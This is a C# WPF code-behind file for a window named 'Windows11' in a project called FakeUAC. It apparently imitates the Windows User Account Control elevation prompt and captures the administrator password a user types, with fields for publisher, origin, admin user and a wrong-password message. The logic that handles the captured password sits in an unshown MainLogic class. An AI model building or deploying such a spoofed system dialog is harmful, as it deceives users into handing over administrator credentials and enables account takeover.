using System.ComponentModel;
using System.Windows;
using System.Windows.Input;

namespace FakeUAC
{
	public partial class Windows11 : Window
	{
		private MainLogic logic = new MainLogic();
		public Windows11()
		{
			InitializeComponent();
			logic.Init(this, icon, password, title, question, exeName, publisher, origin, showMore, programLoc, continueText, null, yes, no, wrongData, passwordText, admin_user, admin_user_path);
		}
		private void ShowMore(object sender, MouseButtonEventArgs e) => logic.ShowMore(sender, e);
		private void Confirm(object sender, RoutedEventArgs e) => logic.Confirm(sender, e);
		private void Close(object sender, MouseButtonEventArgs e) => logic.Close(sender, e);
		private void Cancel(object sender, RoutedEventArgs e) => logic.Exit();
		private void OnExit(object sender, CancelEventArgs e) => logic.OnExit(sender, e);

		private void Preview(object sender, MouseButtonEventArgs e)
		{
			password2.Text = password.Password;
			password.Visibility = Visibility.Collapsed;
			password2.Visibility = Visibility.Visible;
		}

		private void Hide(object sender, MouseButtonEventArgs e) => Hide();
		private void Hide(object sender, MouseEventArgs e) => Hide();

		private void Hide() {
			password.Visibility = Visibility.Visible;
			password2.Visibility = Visibility.Collapsed;
		}
	}
}
